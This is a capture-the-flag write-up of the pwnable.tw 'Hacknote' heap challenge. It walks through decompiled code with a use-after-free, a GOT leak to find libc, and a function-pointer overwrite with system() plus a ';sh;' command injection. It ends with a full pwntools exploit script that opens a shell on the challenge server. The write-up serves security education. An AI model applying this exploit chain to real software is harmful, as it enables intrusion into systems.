# Pwnable.tw - Hacknote

* Website : Pwnable.tw
* Challenge : Hacknote
* Writeup author : Redhung aka r3dhun9
>Contact :[Philip Chen (Facebook)](https://www.facebook.com/philip.chen.581)

## 0x00
This is my first **heap** challenge, and I recommand everyone using [angelheap](https://github.com/scwuaptx/Pwngdb/tree/master/angelheap) to solve this kind of challenges. :+1: 

## 0x01
The first thing we have to do is **checksec** :

![](https://i.imgur.com/Q5ndn6v.png)

**Partial RELRO** means maybe we can overwrite **GOT**.

**No PIE** means we can write the true address by using **objdump**.

Let's use **IDA Pro** to decompile the binary :

There are three functions named **add_note**, **delete_note** and **print_note**.

```c
void __cdecl __noreturn main()
{
  int buf_int; // eax
  char buf; // [esp+8h] [ebp-10h]
  unsigned int canary; // [esp+Ch] [ebp-Ch]

  canary = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      read(0, &buf, 4u);
      buf_int = atoi(&buf);
      if ( buf_int != 2 )
        break;
      delete_note();
    }
    if ( buf_int > 2 )
    {
      if ( buf_int == 3 )
      {
        print_note();
      }
      else
      {
        if ( buf_int == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( buf_int != 1 )
        goto LABEL_13;
      add_note();
    }
  }
}
```

1. **add_note** is a function which **malloc** two areas, the first area stores the funtion pointer, and the second area stores our content.

```c
unsigned int add_note()
{
  _DWORD *note_ptr; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int canary; // [esp+1Ch] [ebp-Ch]

  canary = __readgsdword(0x14u);
  if ( current_index <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !ptr[i] )                            // void *ptr[5]
      {
        ptr[i] = malloc(8u);
        if ( !ptr[i] )                          // handle malloc error
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)ptr[i] = sub_804862B;
        printf("Note size :");
        read(0, &buf, 8u);                      // read 8 bytes to size
        size = atoi(&buf);
        note_ptr = ptr[i];                      // note_ptr[1] stores content
        note_ptr[1] = malloc(size);             // malloc our input size
        if ( !*((_DWORD *)ptr[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)ptr[i] + 1), size);
        puts("Success !");
        ++current_index;
        return __readgsdword(0x14u) ^ canary;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ canary;
}
```

2. **delete_note** is a function which **free** two areas, however, the pointer doesn't set **NULL**, so the pointer will be the **dangling pointer**, leading to **Use After Free**.

```c
unsigned int delete_note()
{
  int buf_int; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int canary; // [esp+Ch] [ebp-Ch]

  canary = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  buf_int = atoi(&buf);
  if ( buf_int < 0 || buf_int >= current_index )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[buf_int] )
  {
    free(*((void **)ptr[buf_int] + 1));
    free(ptr[buf_int]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ canary;
}
```

3. **print_note** is a function which uses the function pointer in the first area.

```c
unsigned int print_note()
{
  int buf_int; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int canary; // [esp+Ch] [ebp-Ch]

  canary = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  buf_int = atoi(&buf);
  if ( buf_int < 0 || buf_int >= current_index )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[buf_int] )
    (*(void (__cdecl **)(void *))ptr[buf_int])(ptr[buf_int]);
  return __readgsdword(0x14u) ^ canary;
}
```

## 0x02
Our thoughts would be clear and shows below:

**1. add_note0(16,'aaa')**
**2. add_note1(16,'bbb')**

Our heap would be like this:

![](https://i.imgur.com/AB0qMDV.png)

**3. del_note(0)**
**4. del_note(1)**

Our fastbin would be like this:

![](https://i.imgur.com/dQwWlhp.png)

**5. addnote(8,'function_what_we_want') <- anywhere**

We would like to leak libc address to calculate the offset and get the **system()** address.

I spend lots of time using **< puts@plt >**, but gain nothing.

So I use **0x0804862b** to leak **GOT**, and I perfectly get the libc address.

Last, we overwrite the function pointer to **system()**, but we got the mysterious command:

![](https://i.imgur.com/wFXIoJ4.png)

It seems like our parameter to **system()** went wrong, let's look back to the IDA:

```c
  if ( ptr[buf_int] )
    (*(void (__cdecl **)(void *))ptr[buf_int])(ptr[buf_int]);
```

It equals to this:

```c
  if ( ptr[buf_int] )
    system(ptr[buf_int]);
```

Thus we get the mysterious command from the heap.

That's fine, we can input **";sh;"** to do the command injection. :laughing: 

## 0x03
Exploit:
```python
from pwn import *

#r = process(['/glibc/2.23/32/lib/ld-2.23.so','./hacknote'],env={'LD_PRELOAD':'./libc_32.so.6'})
#r = process('./hacknote')
r = remote('chall.pwnable.tw',10102)

def addnote(size,content):
    r.sendafter(':','1\n')
    r.sendafter(':',size+'\n')
    r.sendafter(':',content+'\n')

def delnote(index):
    r.sendafter(':','2\n')
    r.sendafter(':',index+'\n')

def printnote(index):
    r.sendafter(':','3\n')
    r.sendafter(':',index+'\n')

def main():
    addnote('16','aaa')
    addnote('16','bbb')
    delnote('0')
    delnote('1')
    addnote('8',p32(0x0804862b)+p32(0x0804a004))
    printnote('0')
    leak = r.recvuntil('-')
    libc_leak = u32(leak[15:19])
    libc_base_offset = 0xd41c0
    libc_system_offset = 0x0003a940
    libc_base = libc_leak - libc_base_offset
    libc_system = libc_base + libc_system_offset
    delnote('2')
    addnote('8',p32(libc_system)+';sh;')
    printnote('0')
    r.interactive()

if __name__ == '__main__':
    main()
```
